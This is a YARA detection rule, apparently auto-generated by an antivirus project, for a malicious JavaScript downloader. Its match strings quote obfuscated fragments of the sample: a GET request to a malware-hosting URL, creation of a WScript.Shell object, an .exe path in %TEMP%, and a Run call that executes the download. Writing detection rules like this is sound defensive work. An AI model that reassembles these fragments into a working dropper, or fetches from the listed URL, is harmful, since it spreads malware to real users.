rule sig_20160401_04573a0fa2333d487556f56d73e73329 {
  meta:
    description = "datamaliciousorder - file 20160401_04573a0fa2333d487556f56d73e73329.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e804af519311fd294b7dc58972589f9327ad0ade10e044c3ff3b13acdbf56477"

  strings:
    $s1  = "LuYbv[QbhCsd](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "function KkpJkh(KteLk, TwtBuh){UkFp = UkFp * 1; return KteLk - TwtBuh;};" fullword ascii
    $s3  = "var ZsdBe = function SurJoc() {return WScript[JhqDr](\"WScript\"+\".Shell\");}(), UgEcd = 11;" fullword ascii
    $s4  = "if (LuYbv[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZvjZy(){return YfQp + \"\";};" fullword ascii
    $s6  = "function EaqUi() {return ZsdBe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"TF3XLmarL.ex\" + \"e\";};" fullword ascii
    $s7  = "function NrrXs() {return ((CroQaj == true) && (CroQaj == OucXz)) ? 1 : UkFp;};" fullword ascii
    $s8  = "function LthFsn(){return JhqDr;};" fullword ascii
    $s9  = "}while (HzDa);" fullword ascii
    $s10 = "function HqUi(SwOn) {var HemPp = (1, 2, 3, 4, 5, SwOn); return HemPp;};" fullword ascii
    $s11 = "var OucXz = false;" fullword ascii
    $s12 = "var KuJb = new this[\"Date\"]();" fullword ascii
    $s13 = "var CroQaj = false;" fullword ascii
    $s14 = "return KkpJkh(EfXv, EwgBe);" fullword ascii
    $s15 = "OucXz = true; " fullword ascii
    $s16 = "var WoCl = false;" fullword ascii
    $s17 = "CroQaj = true; " fullword ascii
    $s18 = "function JtqBq(){return 23;};" fullword ascii
    $s19 = "function MllGer(TbHj){ZsdBe[\"R\"+\"un\"](TbHj, UkFp, UkFp);};" fullword ascii
    $s20 = "function OqwHe()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}